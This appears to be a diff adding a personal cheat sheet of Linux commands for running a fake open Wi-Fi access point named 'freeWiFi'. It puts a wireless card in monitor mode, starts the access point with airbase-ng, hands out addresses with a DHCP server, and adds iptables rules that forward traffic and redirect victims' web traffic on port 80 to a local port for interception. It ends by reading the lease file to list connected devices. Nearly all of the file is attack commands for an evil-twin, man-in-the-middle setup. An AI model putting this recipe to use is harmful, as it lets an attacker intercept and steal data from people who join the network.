@@ -1,0 +1,70 @@
+####################
+## Put interface in monitor mode
+####################
+
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+sudo iwconfig wlan0
+
+####################
+## Creating the AP
+####################
+
+route -n #get the gateway IP
+apt-get install isc-dhcp-server
+route 
+nano /etc/dhcpd.conf
+	#edit conf file
+	authoritative;
+	default-lease-time 600;
+	max-lease-time 7200;
+	subnet 192.168.1.0 netmask 255.255.255.0 {
+	option routers 192.168.1.1;
+	option subnet-mask 255.255.255.0;
+	option domain-name "freeWiFi";
+	option domain-name-servers 192.168.1.1;
+	range 192.168.1.100 192.168.1.140;
+	}
+
+#### PUT INTERFACE IN MONITOR MODE
+
+airbase-ng -c 11 -e freeWiFi <monitor inteface> 
+## AP created --> open new terminal to configure DHCP Server
+
+####################
+## Configuring the DHCP Server
+####################
+
+ifconfig at0 192.168.1.1 netmask 255.255.255.0
+ifconfig at0 mtu 1400
+route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.1.254
+iptables -P FORWARD ACCEPT
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+iptables --table nat --append POSTROUTING --out-interface wlan1 -j MASQUERADE
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
+/etc/init.d/isc-dhcp-server start
+
+
+####################
+## Accessing the DHCP Server
+####################
+cd /var/lib/dhcp/
+ls -l
+gedit dhcpd.leases
+
+####################
+## Stopping the DHCP Server
+####################
+/etc/init.d/isc-dhcp-server stop
+
+
+
+
+
+
+
+
